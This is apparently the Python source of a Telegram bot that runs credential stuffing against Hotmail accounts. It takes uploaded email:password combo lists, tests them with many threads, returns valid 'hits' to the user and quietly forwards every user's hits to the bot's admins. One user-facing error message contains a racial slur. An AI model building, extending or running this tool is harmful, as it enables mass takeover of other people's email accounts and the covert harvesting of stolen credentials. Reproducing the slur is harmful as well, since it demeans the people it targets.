import io
import os
import tempfile
import threading
import time
from queue import Queue, Empty

import telebot
from telebot import types

from config import (
    ADMIN_IDS,
    BOT_DEV,
    BOT_NAME,
    BOT_TOKEN,
    DEFAULT_THREADS,
    MAX_LINES,
    PROGRESS_UPDATE_SECONDS,
)
from hotmail_checker import HotmailChecker
from stats import StatsStore, UsersStore


bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML", threaded=True)
checker = HotmailChecker()

stats = StatsStore("stats.json")
users_store = UsersStore("users.json")

jobs = {}
active_by_user = {}
job_lock = threading.Lock()

pending_limits = {}
maintenance_mode = False


def is_admin(user_id):
    return user_id in ADMIN_IDS


def format_header():
    return "<b>Hᴏᴛᴍᴀɪʟ Iɴʙᴏx Sᴇᴀʀᴄʜᴇʀ</b>"


def format_duration(seconds):
    seconds = max(0, int(seconds))
    h = seconds // 3600
    m = (seconds % 3600) // 60
    s = seconds % 60
    return f"{h:02d}:{m:02d}:{s:02d}"



def format_progress(job):
    elapsed = time.time() - job.start_time
    cpm = int((job.processed / elapsed) * 60) if elapsed > 0 else 0
    status_line = "🟡 Running" if not job.stop_event.is_set() else "🛑 Stopping..."
    lines = (
        f"{format_header()}\n"
        f"{status_line}\n"
        f"<code>Progress: {job.processed}/{job.total}\n"
        f"Hits: {job.hits} | Bad: {job.bad}\n"
        f"CPM: {cpm} | T/t: {format_duration(elapsed)}</code>\n"
        f"<b>by</b> {BOT_DEV}"
    )
    return lines


def format_active_summary(job):
    elapsed = time.time() - job.start_time
    cpm = int((job.processed / elapsed) * 60) if elapsed > 0 else 0
    return (
        f"{format_header()}\n"
        "<b>Already running a check.</b>\n"
        f"<code>Progress: {job.processed}/{job.total}\n"
        f"Hits: {job.hits} | Bad: {job.bad}\n"
        f"CPM: {cpm} | T/t: {format_duration(elapsed)}</code>\n"
        f"<b>by</b> {BOT_DEV}"
    )

def build_stop_markup(job_id):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🛑 Stop", callback_data=f"stop:{job_id}"))
    return markup


def build_limit_markup(user_id):
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("✅ Yes", callback_data=f"limit_yes:{user_id}"),
        types.InlineKeyboardButton("❌ No", callback_data=f"limit_no:{user_id}"),
    )
    return markup


def build_admin_markup():
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("📊 Stats", callback_data="adm:stats"),
        types.InlineKeyboardButton("📡 Active Checks", callback_data="adm:active"),
    )
    markup.add(
        types.InlineKeyboardButton("🚧 Toggle Maintenance", callback_data="adm:maint"),
    )
    return markup


class Job:
    def __init__(self, user_id, chat_id, total, threads, user_link, reply_to_message_id):
        self.user_id = user_id
        self.chat_id = chat_id
        self.user_link = user_link
        self.reply_to_message_id = reply_to_message_id
        self.total = total
        self.threads = threads
        self.processed = 0
        self.hits = 0
        self.bad = 0
        self.retry = 0
        self.hit_lines = []
        self.start_time = time.time()
        self.stop_event = threading.Event()
        self.done_event = threading.Event()
        self.lock = threading.Lock()
        self.message_id = None
        self.job_id = f"{user_id}-{int(self.start_time)}"


def parse_combos(file_bytes):
    text = file_bytes.decode("utf-8", errors="ignore").replace("\ufeff", "")
    combos = []
    for line in text.splitlines():
        line = line.strip()
        if ":" not in line:
            continue
        email, password = line.split(":", 1)
        email = email.strip()
        password = password.strip()
        if email and password:
            combos.append((email, password))
    return combos


def send_hits_file(chat_id, hit_lines, caption, reply_to_message_id=None):
    content = "".join(hit_lines) if hit_lines else "No hits found.\n"
    temp = tempfile.NamedTemporaryFile(delete=False, suffix=".txt")
    try:
        temp.write(content.encode("utf-8", errors="ignore"))
        temp.close()
        with open(temp.name, "rb") as f:
            bot.send_document(chat_id, f, caption=caption, reply_to_message_id=reply_to_message_id)
    finally:
        if os.path.exists(temp.name):
            os.remove(temp.name)


def update_progress_loop(job):
    while not job.done_event.is_set():
        try:
            bot.edit_message_text(
                format_progress(job),
                chat_id=job.chat_id,
                message_id=job.message_id,
                reply_markup=build_stop_markup(job.job_id),
            )
        except Exception:
            pass
        time.sleep(PROGRESS_UPDATE_SECONDS)

    try:
        bot.edit_message_text(
            format_progress(job),
            chat_id=job.chat_id,
            message_id=job.message_id,
            reply_markup=None,
        )
    except Exception:
        pass


def run_job(job, combos, is_admin_user):
    queue = Queue()
    for combo in combos:
        queue.put(combo)

    def worker():
        while not job.stop_event.is_set():
            try:
                email, password = queue.get_nowait()
            except Empty:
                return
            result = checker.check_account(email, password)
            with job.lock:
                status = result.get("status")
                if status == "HIT":
                    job.hits += 1
                    capture = result.get("capture")
                    if capture:
                        job.hit_lines.append(capture)
                elif status == "BAD":
                    job.bad += 1
                else:
                    job.retry += 1
                job.processed += 1
            queue.task_done()

    threads = []
    for _ in range(job.threads):
        t = threading.Thread(target=worker, daemon=True)
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    job.done_event.set()

    status_label = "Completed" if not job.stop_event.is_set() else "Stopped"
    elapsed = time.time() - job.start_time
    cpm = int((job.processed / elapsed) * 60) if elapsed > 0 else 0

    summary = (
        f"{format_header()}\n"
        f"<b>{status_label}</b> ✅\n"
        f"<code>Checked: {job.processed}/{job.total}\n"
        f"Hits: {job.hits} | Bad: {job.bad} | Retry: {job.retry}\n"
        f"CPM: {cpm} | Time: {format_duration(elapsed)}</code>\n"
        f"<b>by</b> {BOT_DEV}"
    )

    send_hits_file(job.chat_id, job.hit_lines, summary, reply_to_message_id=job.reply_to_message_id)

    admin_caption = (
        f"{format_header()}\n"
        f"<b>{status_label}</b> ✅\n"
        f"<code>Checked: {job.processed}/{job.total}\n"
        f"Hits: {job.hits} | Bad: {job.bad} | Retry: {job.retry}\n"
        f"CPM: {cpm} | Time: {format_duration(elapsed)}</code>\n"
        f"<b>User:</b> {job.user_link}\n"
        f"<b>by</b> {BOT_DEV}"
    )

    for admin_id in ADMIN_IDS:
        try:
            send_hits_file(admin_id, job.hit_lines, admin_caption)
        except Exception:
            pass

    stats.add_user(job.user_id)
    stats.add_run(job.processed, job.hits)

    with job_lock:
        jobs.pop(job.job_id, None)
        if not is_admin_user:
            active_by_user.pop(job.user_id, None)

    print(f"[DONE] job_id={job.job_id} user_id={job.user_id} status={status_label} hits={job.hits} bad={job.bad} retry={job.retry}")


def start_job(chat_id, user_id, combos, user_link, is_admin_user, reply_to_message_id):
    with job_lock:
        if not is_admin_user and user_id in active_by_user:
            job = jobs.get(active_by_user[user_id])
            if job:
                bot.send_message(
                    chat_id,
                    format_active_summary(job),
                    reply_to_message_id=reply_to_message_id,
                )
            else:
                bot.send_message(
                    chat_id,
                    "⚠️ Nigger only one check at a time is allowed.",
                    reply_to_message_id=reply_to_message_id,
                )
            return
        job = Job(user_id, chat_id, len(combos), DEFAULT_THREADS, user_link, reply_to_message_id)
        jobs[job.job_id] = job
        if not is_admin_user:
            active_by_user[user_id] = job.job_id

    msg = bot.send_message(chat_id, "🟡 Starting checker...", reply_to_message_id=reply_to_message_id)
    job.message_id = msg.message_id

    updater = threading.Thread(target=update_progress_loop, args=(job,), daemon=True)
    updater.start()

    runner = threading.Thread(target=run_job, args=(job, combos, is_admin_user), daemon=True)
    runner.start()
    print(f"[START] job_id={job.job_id} user_id={user_id} combos={len(combos)} threads={DEFAULT_THREADS}")


@bot.message_handler(commands=["start"])
def handle_start(message):
    print(f"[START_CMD] user_id={message.from_user.id}")
    users_store.add_user(message.from_user.id)
    welcome = (
        f"{format_header()}\n\n"
        "📥 <b>Upload a .txt file with email:pass combos.</b>\n\n"
        "<b>Features</b>\n"
        "• Max 6,000 Lines per user\n"
        f"• {DEFAULT_THREADS} Threads For Fast Checking\n"
        "• Results Sent As file\n\n"
        "⚠️ <b>Only One Check At A Time Allowed.</b>\n\n"
        f"<b>Bot dev:</b> {BOT_DEV}"
    )
    bot.send_message(message.chat.id, welcome, reply_to_message_id=message.message_id)


@bot.message_handler(commands=["status"])
def handle_status(message):
    if not is_admin(message.from_user.id):
        return
    print(f"[STATUS_CMD] admin_id={message.from_user.id}")
    snap = stats.snapshot()
    text = (
        f"{format_header()}\n"
        f"<b>Admin Status</b>\n"
        f"<code>Total Users: {snap['total_users']}\n"
        f"Total Lines Checked: {snap['total_lines_checked']}\n"
        f"Total Hits: {snap['total_hits']}</code>\n"
        f"<b>by</b> {BOT_DEV}"
    )
    bot.send_message(message.chat.id, text, reply_to_message_id=message.message_id)


@bot.message_handler(commands=["adm"])
def handle_admin_panel(message):
    if not is_admin(message.from_user.id):
        return
    print(f"[ADMIN_PANEL] admin_id={message.from_user.id}")
    text = (
        f"{format_header()}\n"
        "<b>Admin Panel</b>\n"
        "Choose an option below.\n"
        f"<b>by</b> {BOT_DEV}"
    )
    bot.send_message(
        message.chat.id, text, reply_markup=build_admin_markup(), reply_to_message_id=message.message_id
    )


@bot.message_handler(commands=["broadcast"])
def handle_broadcast(message):
    if not is_admin(message.from_user.id):
        return
    if not message.reply_to_message or not message.reply_to_message.text:
        bot.send_message(
            message.chat.id,
            "⚠️ Reply to a text message to broadcast it.",
            reply_to_message_id=message.message_id,
        )
        return

    payload = message.reply_to_message.text
    users = users_store.list_users()
    total = len(users)
    sent = 0
    failed = 0

    progress_msg = bot.send_message(
        message.chat.id,
        f"{format_header()}\n<b>Broadcasting...</b>\n<code>Total: {total}\nSent: 0\nFailed: 0</code>\n<b>by</b> {BOT_DEV}",
        reply_to_message_id=message.message_id,
    )

    for user_id in users:
        try:
            bot.send_message(user_id, payload)
            sent += 1
        except Exception:
            failed += 1
        if (sent + failed) % 10 == 0 or (sent + failed) == total:
            try:
                bot.edit_message_text(
                    f"{format_header()}\n<b>Broadcasting...</b>\n<code>Total: {total}\nSent: {sent}\nFailed: {failed}</code>\n<b>by</b> {BOT_DEV}",
                    message.chat.id,
                    progress_msg.message_id,
                )
            except Exception:
                pass

    try:
        bot.edit_message_text(
            f"{format_header()}\n<b>Broadcast done ✅</b>\n<code>Total: {total}\nSent: {sent}\nFailed: {failed}</code>\n<b>by</b> {BOT_DEV}",
            message.chat.id,
            progress_msg.message_id,
        )
    except Exception:
        pass


@bot.callback_query_handler(func=lambda call: call.data.startswith("adm:"))
def handle_admin_actions(call):
    if not is_admin(call.from_user.id):
        return
    print(f"[ADMIN_ACTION] admin_id={call.from_user.id} action={call.data}")

    action = call.data.split(":", 1)[1]
    if action == "stats":
        snap = stats.snapshot()
        text = (
            f"{format_header()}\n"
            f"<b>Admin Status</b>\n"
            f"<code>Total Users: {snap['total_users']}\n"
            f"Total Lines Checked: {snap['total_lines_checked']}\n"
            f"Total Hits: {snap['total_hits']}</code>\n"
            f"<b>by</b> {BOT_DEV}"
        )
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=build_admin_markup())
    elif action == "active":
        with job_lock:
            active = list(jobs.values())
        if not active:
            text = f"{format_header()}\n<b>No active checks right now.</b>\n<b>by</b> {BOT_DEV}"
        else:
            lines = [
                f"{format_header()}",
                "<b>Active Checks</b>",
            ]
            for job in active:
                lines.append(
                    f"<code>User {job.user_id}: {job.processed}/{job.total} | Hits: {job.hits}</code>"
                )
            lines.append(f"<b>by</b> {BOT_DEV}")
            text = "\n".join(lines)
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=build_admin_markup())
    elif action == "maint":
        global maintenance_mode
        maintenance_mode = not maintenance_mode
        status = "ON" if maintenance_mode else "OFF"
        text = (
            f"{format_header()}\n"
            f"<b>Maintenance Mode:</b> {status}\n"
            f"<b>by</b> {BOT_DEV}"
        )
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=build_admin_markup())

    bot.answer_callback_query(call.id)


@bot.callback_query_handler(func=lambda call: call.data.startswith("stop:"))
def handle_stop(call):
    job_id = call.data.split(":", 1)[1]
    with job_lock:
        job = jobs.get(job_id)
        if job and not is_admin(call.from_user.id) and job.user_id != call.from_user.id:
            job = None
    if not job or job.job_id != job_id:
        bot.answer_callback_query(call.id, "No active check.", show_alert=True)
        return

    job.stop_event.set()
    print(f"[STOP] job_id={job.job_id} by_user={call.from_user.id}")
    bot.answer_callback_query(call.id, "Stopping...", show_alert=False)


@bot.callback_query_handler(func=lambda call: call.data.startswith("limit_"))
def handle_limit_decision(call):
    user_id = int(call.data.split(":", 1)[1])
    if call.from_user.id != user_id:
        bot.answer_callback_query(call.id, "Not for you.", show_alert=True)
        return

    pending = pending_limits.pop(user_id, None)
    if not pending:
        bot.answer_callback_query(call.id, "Expired.", show_alert=True)
        return

    if call.data.startswith("limit_yes"):
        start_job(
            pending["chat_id"],
            user_id,
            pending["combos"],
            pending["user_link"],
            pending["is_admin"],
            pending["reply_to_message_id"],
        )
        bot.edit_message_text(
            f"{format_header()}\n<b>Starting with first {len(pending['combos'])} lines.</b>",
            call.message.chat.id,
            call.message.message_id,
        )
    else:
        bot.edit_message_text(
            f"{format_header()}\n<b>Cancelled.</b>",
            call.message.chat.id,
            call.message.message_id,
        )

    bot.answer_callback_query(call.id)


@bot.message_handler(content_types=["document"])
def handle_document(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    print(f"[UPLOAD] user_id={user_id} filename={message.document.file_name}")

    if maintenance_mode and not is_admin(user_id):
        bot.send_message(
            chat_id,
            "🚧 Maintenance mode is ON. Try again later.",
            reply_to_message_id=message.message_id,
        )
        return

    with job_lock:
        if user_id in active_by_user and not is_admin(user_id):
            job = jobs.get(active_by_user[user_id])
            if job:
                bot.send_message(
                    chat_id,
                    format_active_summary(job),
                    reply_to_message_id=message.message_id,
                )
            else:
                bot.send_message(
                    chat_id,
                    "⚠️ Only one check at a time is allowed.",
                    reply_to_message_id=message.message_id,
                )
            return

    doc = message.document
    if not doc.file_name.lower().endswith(".txt"):
        bot.send_message(
            chat_id,
            "❌ Please upload a .txt file only.",
            reply_to_message_id=message.message_id,
        )
        return

    try:
        file_info = bot.get_file(doc.file_id)
        downloaded = bot.download_file(file_info.file_path)
    except Exception:
        bot.send_message(
            chat_id,
            "❌ Failed to download the file. Try again.",
            reply_to_message_id=message.message_id,
        )
        return

    combos = parse_combos(downloaded)
    if not combos:
        bot.send_message(
            chat_id,
            "⚠️ No valid combos found in the file.",
            reply_to_message_id=message.message_id,
        )
        return

    is_admin_user = is_admin(user_id)
    total = len(combos)

    if not is_admin_user and total > MAX_LINES:
        preview = (
            f"{format_header()}\n"
            f"<b>More than {MAX_LINES} lines detected.</b>\n"
            f"Total combos in file: <b>{total}</b>\n\n"
            f"We will check only the first <b>{MAX_LINES}</b>.\n"
            "Do you want to continue?"
        )
        pending_limits[user_id] = {
            "chat_id": chat_id,
            "combos": combos[:MAX_LINES],
            "user_link": user_link(message.from_user),
            "is_admin": is_admin_user,
            "reply_to_message_id": message.message_id,
        }
        bot.send_message(
            chat_id,
            preview,
            reply_markup=build_limit_markup(user_id),
            reply_to_message_id=message.message_id,
        )
        return

    start_job(
        chat_id,
        user_id,
        combos,
        user_link(message.from_user),
        is_admin_user,
        message.message_id,
    )


def user_link(user):
    if user.username:
        return f"@{user.username}"
    return f"<a href=\"tg://user?id={user.id}\">User</a>"


def main():
    print(f"[BOOT] {BOT_NAME} starting...")
    bot.infinity_polling(skip_pending=True)


if __name__ == "__main__":
    main()
